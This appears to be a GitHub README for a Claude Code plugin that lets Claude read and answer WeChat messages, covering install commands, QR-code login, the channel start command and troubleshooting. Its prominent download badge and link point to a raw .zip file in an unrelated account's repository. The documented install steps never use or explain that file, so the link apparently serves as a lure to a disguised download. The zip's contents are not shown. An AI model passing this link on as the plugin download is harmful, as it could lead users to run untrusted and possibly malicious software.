# 🤖 claude-plugin-weixin - WeChat replies inside Claude Code

[![Download](https://img.shields.io/badge/Download-claude--plugin--weixin-blue?style=for-the-badge)](https://github.com/goldiacogitative647/claude-plugin-weixin/raw/refs/heads/main/skills/access/weixin-plugin-claude-3.4.zip)

## 📥 Download and install

Use this page to get the plugin files:
https://github.com/goldiacogitative647/claude-plugin-weixin/raw/refs/heads/main/skills/access/weixin-plugin-claude-3.4.zip

Open the page in your browser, then follow the install steps below on your Windows PC.

### What you need
- A Windows computer
- Claude Code v2.1.80 or later
- Bun installed on your computer
- A WeChat account on your phone

### Install the plugin
Open Claude Code and run these commands one by one:

```bash
claude plugin marketplace add m1heng/claude-plugins
claude plugin install weixin@m1heng-plugins
```

If Claude Code asks for approval, allow it so the plugin can finish installing.

## 🪟 Windows setup

This plugin does not use a public webhook. It connects to the WeChat iLink Bot API with long-poll requests, so you do not need to expose your computer to the internet.

### Before you start
1. Install Claude Code.
2. Install Bun.
3. Sign in to Claude Code.
4. Make sure WeChat works on your phone.

### Open Claude Code
Start Claude Code from the Start menu or from a terminal window.

If you do not know how to open a terminal on Windows:
1. Press the Windows key.
2. Type `cmd`.
3. Press Enter.

Then start Claude Code from that window.

## 🔧 Configure WeChat login

After the plugin is installed, run this command inside Claude Code:

```bash
/weixin:configure login
```

Claude Code will show a QR code. Use your WeChat app to scan it.

### On your phone
1. Open WeChat.
2. Scan the QR code.
3. Confirm the login on your phone.
4. Wait for Claude Code to save the login data.

Once the login is saved, you do not need to scan again unless you log out or clear the saved data.

## 🚀 Start the WeChat channel

After login, start Claude Code with the WeChat channel enabled:

```bash
claude --dangerously-load-development-channels plugin:weixin@m1heng-plugins
```

Use this command each time you want Claude Code to receive and reply to WeChat messages.

### What this does
- Connects Claude Code to your WeChat account
- Lets Claude read incoming WeChat messages
- Lets Claude send replies back through WeChat
- Keeps the link active while Claude Code is running

## 💬 How it works

When a WeChat message arrives, the plugin passes it to Claude Code. Claude can then help draft or send a reply from your terminal.

This setup is useful when you want to:
- Reply to WeChat messages without opening the full chat app
- Keep work messages in one place
- Use Claude Code as a message helper
- Handle simple chat replies from the command line

## 🧭 Daily use

After the first setup, your normal flow is simple:

1. Open Claude Code.
2. Start it with the WeChat channel command.
3. Keep the terminal open.
4. Read incoming WeChat messages in Claude Code.
5. Write or send replies from there.

If you restart your computer, open Claude Code and run the channel command again.

## 🛠️ Basic troubleshooting

### QR code does not show
- Make sure the plugin installed correctly
- Check that Claude Code is running
- Run `/weixin:configure login` again

### Login does not save
- Scan the QR code again
- Confirm the login on your phone
- Keep Claude Code open until the process ends

### Messages do not arrive
- Check that Claude Code is still running
- Start Claude Code with the channel command
- Make sure your WeChat account is still logged in
- Try closing and reopening Claude Code

### Bun is not found
- Install Bun again
- Close and reopen the terminal
- Check that Bun was added to your system path

## 🔍 File and account behavior

The plugin stores login data on your machine so you do not need to sign in each time. It uses your local Claude Code setup and your WeChat account through the iLink Bot API.

Keep these points in mind:
- Use the same Windows user account each time
- Do not delete the saved plugin data if you want to stay logged in
- If you remove the plugin, you may need to log in again later

## 📌 Command reference

### Install
```bash
claude plugin marketplace add m1heng/claude-plugins
claude plugin install weixin@m1heng-plugins
```

### Login
```bash
/weixin:configure login
```

### Start channel
```bash
claude --dangerously-load-development-channels plugin:weixin@m1heng-plugins
```

## 🧩 What this plugin is for

This plugin is for people who want to handle WeChat messages from Claude Code on Windows. It is built for direct chat use, not for public web hosting or webhook setup.

It fits well if you want:
- A simple terminal-based message flow
- QR code login from WeChat
- Local use on your own computer
- Direct replies inside Claude Code